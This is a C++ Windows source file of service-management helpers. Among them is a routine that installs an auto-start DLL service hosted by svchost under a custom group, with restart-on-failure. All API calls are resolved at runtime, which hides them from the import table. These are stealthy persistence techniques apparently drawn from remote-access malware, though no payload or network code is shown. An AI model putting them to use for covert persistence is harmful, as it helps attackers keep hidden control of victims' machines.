#include "InstallService.h"
#include <winsvc.h>

static   long   holdrand   =   1L; 

void   __cdecl   mysrand   (unsigned   int   seed)   
{   
	holdrand   =   (long)seed;   
}

int   __cdecl   myrand   ( void)   
{   
	return(((holdrand   =   holdrand   *   214013L   +   2531011L)   >>   16)   &   0x7fff);   
}

UINT NtStartService(LPCTSTR lpService)
{
    SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
    SERVICE_STATUS   ServiceStatus;
    DWORD            dwErrorCode;
    DWORD            dwReturnCode;

    HINSTANCE advapi32 = LoadLibrary(_T("Advapi32.dll")); 

    typedef SC_HANDLE (WINAPI *OPENSCMANAGER)(LPCTSTR lpMachineName, LPCTSTR lpDatabaseName,DWORD       dwDesiredAccess); 
#ifdef _UNICODE
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerW");
#else
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerA");
#endif

    typedef SC_HANDLE  (WINAPI *OSA)(SC_HANDLE hSCManager,LPCTSTR lpServiceName,DWORD dwDesiredAccess); 
#ifdef _UNICODE
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceW"); 
#else
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceA");
#endif

    typedef BOOL (WINAPI *ASSA)(SC_HANDLE hService,DWORD dwNumServiceArgs,LPCTSTR *lpServiceArgVectors); 
#ifdef _UNICODE
    ASSA  myStartService = (ASSA)GetProcAddress(advapi32, "StartServiceW");
#else
    ASSA  myStartService = (ASSA)GetProcAddress(advapi32, "StartServiceA");
#endif

    typedef BOOL (WINAPI *CSH)(SC_HANDLE hSCObject); 
    CSH myCloseServiceHandle= (CSH)GetProcAddress(advapi32, "CloseServiceHandle"); 

    typedef BOOL (WINAPI *QSS)(SC_HANDLE,LPSERVICE_STATUS); 
    QSS myQueryServiceStatus= (QSS)GetProcAddress(advapi32, "QueryServiceStatus"); 


    schSCManager=myOpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//打开服务控制管理器数据库
    if(!schSCManager)
    {
        return -1;
    }
    if (NULL!=schSCManager)
    {
        schService=myOpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//获得服务对象的句柄

        if (schService!=NULL)
        {
            if(myStartService(schService,0,NULL)==0)//已经存在该服务,就启动服务                        
            {
                dwErrorCode=GetLastError();
                if(dwErrorCode==ERROR_SERVICE_ALREADY_RUNNING)
                {
                    myCloseServiceHandle(schSCManager);  
                    myCloseServiceHandle(schService);
                    if(advapi32)
                        FreeLibrary(advapi32);
                    return 1;
                }
            }
            else
            {
                return 1;
            }
            while(myQueryServiceStatus(schService,&ServiceStatus)!=0)           
            {
                if(ServiceStatus.dwCurrentState==SERVICE_START_PENDING)
                {
                    Sleep(100);
                }
                else
                {
                    if(advapi32)
                        FreeLibrary(advapi32);
                    break;
                }
            }
            myCloseServiceHandle(schService);
        }
        myCloseServiceHandle(schSCManager);
    }
    else
    {
        if(advapi32)
            FreeLibrary(advapi32);
        //失败鸟
        dwReturnCode = GetLastError();
        myCloseServiceHandle(schSCManager);
        if (dwReturnCode == ERROR_SERVICE_DOES_NOT_EXIST) 
            return -2;
        else
            return -1;
    }
    if(advapi32)
        FreeLibrary(advapi32);
    return 1;
}

UINT NtStopService(LPCTSTR lpService,ULONG   TimeoutSeconds)
{
    SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
    SERVICE_STATUS   RemoveServiceStatus;
    DWORD           dwReturnCode;

    HINSTANCE advapi32 = LoadLibrary(_T("Advapi32.dll")); 

    typedef SC_HANDLE (WINAPI *OPENSCMANAGER)(LPCTSTR lpMachineName, LPCTSTR lpDatabaseName,DWORD       dwDesiredAccess); 
#ifdef _UNICODE
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerW");
#else
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerA");
#endif

    typedef SC_HANDLE  (WINAPI *OSA)(SC_HANDLE hSCManager,LPCTSTR lpServiceName,DWORD dwDesiredAccess); 
#ifdef _UNICODE
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceW"); 
#else
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceA");
#endif

    typedef BOOL (WINAPI *CS)(SC_HANDLE hService,DWORD dwControl,LPSERVICE_STATUS lpServiceStatus);  
    CS myControlService= (CS)GetProcAddress(advapi32, "ControlService"); 

    typedef BOOL (WINAPI *CSH)(SC_HANDLE hSCObject); 
    CSH myCloseServiceHandle= (CSH)GetProcAddress(advapi32, "CloseServiceHandle"); 

    typedef BOOL (WINAPI *QSS)(SC_HANDLE,LPSERVICE_STATUS); 
    QSS myQueryServiceStatus= (QSS)GetProcAddress(advapi32, "QueryServiceStatus"); 

    schSCManager=myOpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//打开服务控制管理器数据库
    if (schSCManager!=NULL)
    {
        schService=myOpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//获得服务对象的句柄
        if (schService!=NULL)
        {
            if(myQueryServiceStatus(schService,&RemoveServiceStatus)!=0)
            {
                if(RemoveServiceStatus.dwCurrentState == SERVICE_STOPPED)//已经停止了,可以返回TRUE
                {
                    return 1;
                }
                else if(RemoveServiceStatus.dwCurrentState!=SERVICE_STOPPED)//停止服务
                {
                    if(myControlService(schService,SERVICE_CONTROL_STOP,&RemoveServiceStatus)!=0)
                    {
                        while(RemoveServiceStatus.dwCurrentState==SERVICE_STOP_PENDING)         
                        {
                            if(!TimeoutSeconds)
                              break;
                            if(TimeoutSeconds != -1)
                                 TimeoutSeconds--;
                            Sleep( 1000 );
                            myQueryServiceStatus(schService,&RemoveServiceStatus);
                        }
                    }
                }
            }
            myCloseServiceHandle(schService);
        }   
        myCloseServiceHandle(schSCManager);
    }
    else
    {
        if(advapi32)
            FreeLibrary(advapi32);
        //失败鸟
        dwReturnCode = GetLastError();
        myCloseServiceHandle(schSCManager);
        if (dwReturnCode == ERROR_SERVICE_DOES_NOT_EXIST) 
            return -2;
        else
            return -1;
    }

    if(advapi32)
        FreeLibrary(advapi32);
    return TRUE;
}

void ServiceConfig(LPCTSTR ServiceName)
{
    char realname[MAX_PATH];
#ifdef UNICODE
    WideCharToMultiByte(CP_ACP, 0, ServiceName, -1, realname, sizeof(realname), NULL, FALSE);
#else
    strcpy(realname,ServiceName);
#endif

    SERVICE_FAILURE_ACTIONS sdBuf;

	HINSTANCE advapi32 = LoadLibraryW(L"Advapi32.dll"); 
	
    typedef SC_HANDLE (WINAPI *OPENSCMANAGER)(LPCTSTR lpMachineName, LPCTSTR lpDatabaseName,DWORD       dwDesiredAccess); 
#ifdef _UNICODE
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerW");
#else
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerA");
#endif
	
	typedef BOOL (WINAPI *CSC2)(SC_HANDLE hService,DWORD dwInfoLevel,LPVOID lpInfo);;
    CSC2 myChangeServiceConfig2= (CSC2)GetProcAddress(advapi32, "ChangeServiceConfig2A");

    typedef SC_HANDLE  (WINAPI *OSA)(SC_HANDLE hSCManager,LPCSTR lpServiceName,DWORD dwDesiredAccess); 
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceA");

	typedef BOOL (WINAPI *CSH)(SC_HANDLE hSCObject); 
    CSH myCloseServiceHandle= (CSH)GetProcAddress(advapi32, "CloseServiceHandle");

    SC_HANDLE sch=myOpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    SC_HANDLE schService = myOpenService(sch,realname,SC_MANAGER_ALL_ACCESS);


    SC_ACTION rgActions[3]={  
        SC_ACTION_RESTART,0,//10s  
        SC_ACTION_RESTART,0,//10s  
        SC_ACTION_RESTART,0  
    }; 

    ZeroMemory(&sdBuf,sizeof(sdBuf));  
    sdBuf.dwResetPeriod = 40;//9000;// 15 minutes  
    sdBuf.lpRebootMsg = NULL ;//reboot
    sdBuf.cActions=sizeof(rgActions)/sizeof(rgActions[0]);
    sdBuf.lpsaActions = rgActions;

    myChangeServiceConfig2(schService,SERVICE_CONFIG_FAILURE_ACTIONS,&sdBuf);                 
    
    if(advapi32)
    {
        FreeLibrary(advapi32);
    }
    
    myCloseServiceHandle(schService); 
}

BOOL NtInstallSvchostService(LPCTSTR strServiceName, 
                           LPCTSTR strDisplayName, 
                           LPCTSTR strDescription,
                           LPCTSTR strDllPath)
{
    int rc = 0;
    HKEY hKey = 0;
    BOOL bRet = FALSE;
    TCHAR szOpenKey[MAX_PATH];

    HINSTANCE advapi32 = LoadLibrary(_T("Advapi32.dll"));
#ifdef _UNICODE
    typedef BOOL (WINAPI *ROKE)(HKEY,LPCTSTR,DWORD,REGSAM , PHKEY); 
    ROKE myRegOpenKeyEx = (ROKE)GetProcAddress(advapi32, "RegOpenKeyExW");

//为什么要强制使用呢。。。
    typedef BOOL (WINAPI *RSVE)(HKEY,LPSTR,DWORD,DWORD,const BYTE*,DWORD); 
    RSVE myRegSetValueEx = (RSVE)GetProcAddress(advapi32, "RegSetValueExA");
    
    typedef BOOL (WINAPI *RCKA)(HKEY,LPCTSTR,PHKEY); 
    RCKA myRegCreateKey = (RCKA)GetProcAddress(advapi32, "RegCreateKeyW");
#else
    typedef BOOL (WINAPI *ROKE)(HKEY,LPCTSTR,DWORD,REGSAM , PHKEY); 
    ROKE myRegOpenKeyEx = (ROKE)GetProcAddress(advapi32, "RegOpenKeyExA");

    typedef BOOL (WINAPI *RSVE)(HKEY,LPCTSTR,DWORD,DWORD,const BYTE*,DWORD); 
    RSVE myRegSetValueEx = (RSVE)GetProcAddress(advapi32, "RegSetValueExA");
    
    typedef BOOL (WINAPI *RCKA)(HKEY,LPCTSTR,PHKEY); 
    RCKA myRegCreateKey = (RCKA)GetProcAddress(advapi32, "RegCreateKeyA");
#endif

    typedef BOOL (WINAPI *RCK)(HKEY); 
    RCK myRegCloseKey = (RCK)GetProcAddress(advapi32, "RegCloseKey");


    //RegSetValueEx的第五个变量为const BYTE*，所以在这里转换一下

    char mbstrDllPath[1024];
    char mbstrServiceName[1024];
#ifdef _UNICODE
    WideCharToMultiByte(CP_ACP, 0, strDllPath, -1, mbstrDllPath, sizeof(mbstrDllPath), NULL, FALSE);
    WideCharToMultiByte(CP_ACP, 0, strServiceName, -1, mbstrServiceName, sizeof(mbstrServiceName), NULL, FALSE);
#else
    lstrcpy(mbstrDllPath,strDllPath);
    lstrcpy(mbstrServiceName,strServiceName);
#endif
    try
    {
      bRet = NtInstallService(strServiceName,
                     strDisplayName,
                     strDescription,
                     _T("%SystemRoot%\\System32\\svchost.exe -k comsvcs"),
                     NULL,
                     false,
                     SERVICE_AUTO_START); //安装服务,并设置为自动启动

        //修改dll指向
        ZeroMemory(szOpenKey,sizeof(szOpenKey));
        wsprintf(szOpenKey, _T("SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters"), strServiceName);
        //rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, szOpenKey, 0, KEY_ALL_ACCESS, &hKey);
        rc = myRegCreateKey(HKEY_LOCAL_MACHINE, szOpenKey,&hKey); 

        rc = myRegSetValueEx(hKey, "ServiceDll", 0, REG_EXPAND_SZ, (unsigned char*)mbstrDllPath, strlen(mbstrDllPath)+1);
        SetLastError(rc);
        myRegCloseKey(hKey);
        //添加服务名到netsvcs组
        ZeroMemory(szOpenKey,sizeof(szOpenKey));
        lstrcpy(szOpenKey, _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost"));
        rc = myRegOpenKeyEx(HKEY_LOCAL_MACHINE, szOpenKey, 0, KEY_ALL_ACCESS, &hKey);
        rc = myRegSetValueEx(hKey, "comsvcs", 0, REG_MULTI_SZ, (unsigned char*)mbstrServiceName, strlen(mbstrServiceName)+1);
        SetLastError(rc);
        myRegCloseKey(hKey);

        bRet = NtStartService(strServiceName);
    }
    catch(TCHAR *str)
    {
        if(str && str[0])
        {
            rc = GetLastError();
        }
    }
    
    myRegCloseKey(hKey);
    
    if(advapi32)
    {
        FreeLibrary(advapi32);
    }

    ServiceConfig(strServiceName);

    return bRet;
}

UINT NtInstallService(LPCTSTR strServiceName, //服务名称
                    LPCTSTR strDisplayName, //服务显示名称
                    LPCTSTR strDescription,//服务描述
                    LPCTSTR strPathName,   //可执行文件的路径
                    LPCTSTR Dependencies,//指定启动该服务前必须先启动的服务或服务组,一般为NULL
                    BOOLEAN KernelDriver, //是否安装驱动程序
                    ULONG   StartType       //启动类型
                    )
{
    BOOL bRet = FALSE;
    HKEY key=NULL;
    SC_HANDLE svc=NULL, scm=NULL;

    HINSTANCE kernel32 =GetModuleHandle(L"KERNEL32.dll");
    HINSTANCE advapi32 = LoadLibrary(_T("Advapi32.dll")); 
  
#ifdef _UNICODE 
    typedef SC_HANDLE (WINAPI *OPENSCMANAGER)(LPCTSTR lpMachineName, LPCTSTR lpDatabaseName,DWORD       dwDesiredAccess); 
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerW"); 

    typedef SC_HANDLE  (WINAPI *OSA)(SC_HANDLE hSCManager,LPCTSTR lpServiceName,DWORD dwDesiredAccess); 
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceW");

    typedef SC_HANDLE (WINAPI *CS)(SC_HANDLE,LPCTSTR,LPCTSTR,DWORD,DWORD,DWORD,DWORD,LPCTSTR,LPCTSTR,LPDWORD,LPCTSTR,LPCTSTR,LPCTSTR); 
    CS myCreateService= (CS)GetProcAddress(advapi32, "CreateServiceW"); 
    
    typedef BOOL (WINAPI *ASSA)(SC_HANDLE hService,DWORD dwNumServiceArgs,LPCTSTR *lpServiceArgVectors); 
    ASSA  myStartService = (ASSA)GetProcAddress(advapi32, "StartServiceW");

    typedef BOOL (WINAPI *ROK)(HKEY,LPCTSTR,PHKEY); 
    ROK myRegOpenKey = (ROK)GetProcAddress(advapi32, "RegOpenKeyW"); 

    typedef BOOL (WINAPI *RSVE)(HKEY,LPSTR,DWORD,DWORD,const BYTE*,DWORD); 
    RSVE myRegSetValueEx = (RSVE)GetProcAddress(advapi32, "RegSetValueExA");
#else
    typedef SC_HANDLE (WINAPI *OPENSCMANAGER)(LPCTSTR lpMachineName, LPCTSTR lpDatabaseName,DWORD       dwDesiredAccess); 
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerA"); 

    typedef SC_HANDLE  (WINAPI *OSA)(SC_HANDLE hSCManager,LPCTSTR lpServiceName,DWORD dwDesiredAccess); 
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceA");

    typedef SC_HANDLE (WINAPI *CS)(SC_HANDLE,LPCTSTR,LPCTSTR,DWORD,DWORD,DWORD,DWORD,LPCTSTR,LPCTSTR,LPDWORD,LPCTSTR,LPCTSTR,LPCTSTR); 
    CS myCreateService= (CS)GetProcAddress(advapi32, "CreateServiceA"); 
    
    typedef BOOL (WINAPI *ASSA)(SC_HANDLE hService,DWORD dwNumServiceArgs,LPCTSTR *lpServiceArgVectors); 
    ASSA  myStartService = (ASSA)GetProcAddress(advapi32, "StartServiceA");

    typedef BOOL (WINAPI *ROK)(HKEY,LPCTSTR,PHKEY); 
    ROK myRegOpenKey = (ROK)GetProcAddress(advapi32, "RegOpenKeyA"); 

    typedef BOOL (WINAPI *RSVE)(HKEY,LPCTSTR,DWORD,DWORD,const BYTE*,DWORD); 
    RSVE myRegSetValueEx = (RSVE)GetProcAddress(advapi32, "RegSetValueExA");
#endif

    typedef BOOL (WINAPI *RCK)(HKEY); 
    RCK myRegCloseKey = (RCK)GetProcAddress(advapi32, "RegCloseKey");

    typedef BOOL (WINAPI *CSH)(SC_HANDLE hSCObject); 
    CSH myCloseServiceHandle= (CSH)GetProcAddress(advapi32, "CloseServiceHandle"); 

    __try
    {
        scm = myOpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
        if (!scm)
            return -1;
        svc = myCreateService(
            scm, 
            strServiceName, 
            strDisplayName,
            SERVICE_ALL_ACCESS,// SERVICE_ALL_ACCESS
            KernelDriver ? SERVICE_KERNEL_DRIVER : SERVICE_WIN32_OWN_PROCESS| SERVICE_INTERACTIVE_PROCESS,
            StartType,
            SERVICE_ERROR_IGNORE,
            strPathName,
            NULL, NULL, Dependencies, NULL, NULL);

        if (svc == NULL)
        {
            if (GetLastError() == ERROR_SERVICE_EXISTS)
            {
                svc = myOpenService(scm,strServiceName,SERVICE_ALL_ACCESS);
                if (svc==NULL)
                    __leave;
                else
                    myStartService(svc,0, 0);
            }
        }

        TCHAR Desc[MAX_PATH];
        wsprintf(Desc,_T("SYSTEM\\CurrentControlSet\\Services\\%s"), strServiceName);
        myRegOpenKey(HKEY_LOCAL_MACHINE,Desc,&key);
#ifdef _UNICODE
        char mbstrDescription[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, strDescription, -1, mbstrDescription, sizeof(mbstrDescription), NULL, FALSE);

        myRegSetValueEx(key,"Description",0,REG_SZ,(CONST BYTE*)mbstrDescription,strlen(mbstrDescription));
#else
        myRegSetValueEx(key,_T("Description"),0,REG_SZ,(CONST BYTE*)strDescription,strlen(strDescription));
#endif

        if (!myStartService(svc,0, 0))
            __leave;

        bRet = TRUE;
    }
    __finally
    {
        if (key!=NULL) 
            myRegCloseKey(key);
        if (svc!=NULL)
            myCloseServiceHandle(svc);
        if (scm!=NULL)
            myCloseServiceHandle(scm);
        if(advapi32)
            FreeLibrary(advapi32);
    }

    return bRet;
}

UINT NtUninstallService(LPCTSTR ServiceName)
{
    SC_HANDLE       schService;
    SC_HANDLE       schSCManager;
    DWORD           RC;
    UINT            return_value;
    
    HINSTANCE advapi32 = LoadLibrary(_T("Advapi32.dll")); 
#ifdef _UNICODE
    typedef SC_HANDLE (WINAPI *OPENSCMANAGER)(LPCTSTR lpMachineName, LPCTSTR lpDatabaseName,DWORD       dwDesiredAccess); 
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerW"); 
    
    typedef SC_HANDLE  (WINAPI *OSA)(SC_HANDLE hSCManager,LPCTSTR lpServiceName,DWORD dwDesiredAccess); 
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceW");
#else
    typedef SC_HANDLE (WINAPI *OPENSCMANAGER)(LPCTSTR lpMachineName, LPCTSTR lpDatabaseName,DWORD       dwDesiredAccess); 
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerA"); 
    
    typedef SC_HANDLE  (WINAPI *OSA)(SC_HANDLE hSCManager,LPCTSTR lpServiceName,DWORD dwDesiredAccess); 
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceA"); 
#endif
    
    typedef BOOL (WINAPI *CSH)(SC_HANDLE hSCObject); 
    CSH myCloseServiceHandle= (CSH)GetProcAddress(advapi32, "CloseServiceHandle");
    
    typedef BOOL (WINAPI *DSS)(SC_HANDLE); 
    DSS myDeleteService = (DSS)GetProcAddress(advapi32, "DeleteService");

    schSCManager = myOpenSCManager(NULL,                   // machine (NULL == local)
                                NULL,                   // database (NULL == default)
                                SC_MANAGER_ALL_ACCESS   // access required
                               );
    if (!schSCManager)
    {
        if(advapi32)
            FreeLibrary(advapi32);
        return -1;
    }
    schService = myOpenService(schSCManager, ServiceName, SERVICE_ALL_ACCESS);
    
    if (!schService)
	{
        RC = GetLastError();
        myCloseServiceHandle(schSCManager);
        if (RC == ERROR_SERVICE_DOES_NOT_EXIST)
        {
            if(advapi32)
                FreeLibrary(advapi32);
            return -2;
        }
        else
        {
            if(advapi32)
                FreeLibrary(advapi32);
            return -1;
        }
    }
    
    return_value = myDeleteService(schService) ? 1 : -1;

    myCloseServiceHandle(schService);
    myCloseServiceHandle(schSCManager);
    if(advapi32)
        FreeLibrary(advapi32);

    return return_value;
}

UINT NtServiceSetStartMode(LPCTSTR ServiceName,ULONG StartMode)
{
    SC_HANDLE       schService;
    SC_HANDLE       schSCManager;
    DWORD           RC;
    UINT            return_value;
    
    HINSTANCE advapi32 = LoadLibrary(_T("Advapi32.dll")); 
#ifdef _UNICODE
    typedef SC_HANDLE (WINAPI *OPENSCMANAGER)(LPCTSTR lpMachineName, LPCTSTR lpDatabaseName,DWORD       dwDesiredAccess); 
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerW"); 
    
    typedef SC_HANDLE  (WINAPI *OSA)(SC_HANDLE hSCManager,LPCTSTR lpServiceName,DWORD dwDesiredAccess); 
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceW");
    
    typedef BOOL (WINAPI *CSC)(SC_HANDLE hService,DWORD dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCTSTR lpBinaryPathName,LPCTSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCTSTR lpDependencies,LPCTSTR lpServiceStartName,LPCTSTR lpPassword,LPCTSTR lpDisplayName); 
    CSC myChangeServiceConfig= (CSC)GetProcAddress(advapi32, "ChangeServiceConfigW");
#else
    typedef SC_HANDLE (WINAPI *OPENSCMANAGER)(LPCTSTR lpMachineName, LPCTSTR lpDatabaseName,DWORD       dwDesiredAccess); 
    OPENSCMANAGER myOpenSCManager = (OPENSCMANAGER)GetProcAddress(advapi32, "OpenSCManagerA"); 
    
    typedef SC_HANDLE  (WINAPI *OSA)(SC_HANDLE hSCManager,LPCTSTR lpServiceName,DWORD dwDesiredAccess); 
    OSA myOpenService = (OSA)GetProcAddress(advapi32, "OpenServiceA");
    
    typedef BOOL (WINAPI *CSC)(SC_HANDLE hService,DWORD dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCTSTR lpBinaryPathName,LPCTSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCTSTR lpDependencies,LPCTSTR lpServiceStartName,LPCTSTR lpPassword,LPCTSTR lpDisplayName); 
    CSC myChangeServiceConfig= (CSC)GetProcAddress(advapi32, "ChangeServiceConfigA");
#endif
    typedef BOOL (WINAPI *QSS)(SC_HANDLE,LPSERVICE_STATUS); 
    QSS myQueryServiceStatus= (QSS)GetProcAddress(advapi32, "QueryServiceStatus"); 
    
    typedef BOOL (WINAPI *CSH)(SC_HANDLE hSCObject); 
    CSH myCloseServiceHandle= (CSH)GetProcAddress(advapi32, "CloseServiceHandle"); 
    

    schSCManager = myOpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    
    if (!schSCManager)
    {
        if(advapi32)
            FreeLibrary(advapi32);
        return -1;
    }
    schService = myOpenService(schSCManager, ServiceName, SERVICE_ALL_ACCESS);
    
    if (!schService) 
    {
        RC = GetLastError();
        myCloseServiceHandle(schSCManager);
        if (RC == ERROR_SERVICE_DOES_NOT_EXIST) 
        {
            if(advapi32)
                FreeLibrary(advapi32);
            return -2;
        }
        else 
        {
            if(advapi32)
                FreeLibrary(advapi32);
            return -1;
        }
    }
    
    return_value = myChangeServiceConfig(schService, SERVICE_NO_CHANGE,
										 StartMode,
										 SERVICE_NO_CHANGE,
										 NULL, NULL, NULL,NULL, NULL, NULL,NULL
										 );
        
    return_value = 0;
    RC = GetLastError();
    myCloseServiceHandle(schService);
    myCloseServiceHandle(schSCManager);

    if(advapi32)
        FreeLibrary(advapi32);

    return return_value;
}

BOOL NtServiceIsExist(LPCTSTR servicename)
{
    TCHAR SubKey[MAX_PATH]={0};
    lstrcpy(SubKey,_T("SYSTEM\\CurrentControlSet\\Services\\"));
    lstrcat(SubKey,servicename);
    
    HINSTANCE advapi32 = LoadLibrary(_T("Advapi32.dll"));
#ifdef _UNICODE
    typedef BOOL (WINAPI *ROKE)(HKEY,LPCTSTR,DWORD,REGSAM , PHKEY); 
    ROKE myRegOpenKeyEx = (ROKE)GetProcAddress(advapi32, "RegOpenKeyExW");
#else
    typedef BOOL (WINAPI *ROKE)(HKEY,LPCTSTR,DWORD,REGSAM , PHKEY); 
    ROKE myRegOpenKeyEx = (ROKE)GetProcAddress(advapi32, "RegOpenKeyExA");
#endif
    typedef BOOL (WINAPI *RCK)(HKEY); 
    RCK myRegCloseKey = (RCK)GetProcAddress(advapi32, "RegCloseKey");

    HKEY hKey;
    if(myRegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
    {
        myRegCloseKey(hKey);
        if(advapi32)
            FreeLibrary(advapi32);
        return TRUE;
    }
    else
    {
        myRegCloseKey(hKey);
        if(advapi32)
            FreeLibrary(advapi32);
        return FALSE;
    }
}
